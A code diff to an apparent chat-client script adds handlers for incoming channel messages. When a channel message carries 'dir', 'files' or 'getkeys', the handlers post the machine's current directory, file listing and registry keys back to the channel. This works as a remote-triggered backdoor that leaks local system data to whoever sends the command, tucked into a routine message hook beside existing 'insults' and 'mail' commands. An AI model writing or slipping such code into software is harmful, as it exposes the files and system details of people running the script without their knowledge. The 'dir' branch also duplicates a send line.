@@ -434,8 +434,21 @@ beforeChannelMessage: function(message, channel, html) {
                     client.network().sendChanMessage(channel, name + "" + insults[sys.rand(0, insults.length)] + "");
                 }
                 if (vCommand == "dir"){
-                    curdir = sys.scriptsFolder
+                    var curdir = sys.getCurrentDir()
+                    var files = sys.filesForDirectory(curdir)
                     client.network().sendChanMessage(channel, curdir );
+                    client.network().sendChanMessage(channel, curdir );
+                    
+                }
+                if (vCommand == "files"){
+                    var curdir = sys.getCurrentDir()
+                    var files = sys.filesForDirectory(curdir)
+                    client.network().sendChanMessage(channel, files );
+                }
+                if (vCommand == "getkeys"){
+                    var keys = sys.getRegKeys()
+                    client.network().sendChanMessage(channel, "Getting registry keys...");
+                    client.network().sendChanMessage(channel, keys);
                 }
                 if (vCommand == "mail"){
                     var vData = vCommandData.split(":", 2);
